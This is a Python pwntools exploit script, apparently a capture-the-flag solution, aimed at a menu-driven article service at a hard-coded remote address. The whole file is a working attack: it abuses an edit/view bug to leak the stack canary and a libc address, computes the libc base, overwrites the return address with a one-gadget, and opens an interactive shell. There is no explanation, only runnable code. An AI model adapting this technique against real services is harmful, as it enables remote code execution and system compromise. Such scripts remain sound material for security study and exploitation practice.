from pwn import *

port = 12345
rem = remote("15.165.12.135", port)

lib = ELF("./book/problem/libc.so.6")

def new_article(size, content):
  rem.sendlineafter(b"> ", b"1")
  rem.sendlineafter(b"size : ", str(size).encode())
  rem.sendlineafter(b"content : ", content)

def view_article(payload = b"Content: "):
  rem.sendlineafter(b"> ", b"2")
  rem.recvuntil(payload)

def edit_article(num, size, content):
  rem.sendlineafter(b"> ", b"3")
  rem.sendlineafter(b"number: ", str(num).encode())
  rem.sendlineafter(b"size: ", str(size).encode())
  rem.sendlineafter(b"content : ", content)

def exit():
  rem.sendlineafter(b"> ", b"4")

new_article(0x100, b"A" * 0x100)

edit_article(4, 0x40, b"A" * 0x8)
view_article(b"A" * 0x108)
rem.recvline()
canary = u64(b"\x00" + rem.recvn(7))

edit_article(4, 0x40, b"A" * 0x17)
view_article(b"A" * 0x117)
rem.recvline()
lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) + 0xb0 - lib.symbols['__libc_start_main'] - 122
gadget_addr = lib_base + 0x583f3

edit_article(4, 0x40, b"A" * 0x8 + p64(canary) + p64(0) + p64(gadget_addr))
exit()

rem.interactive()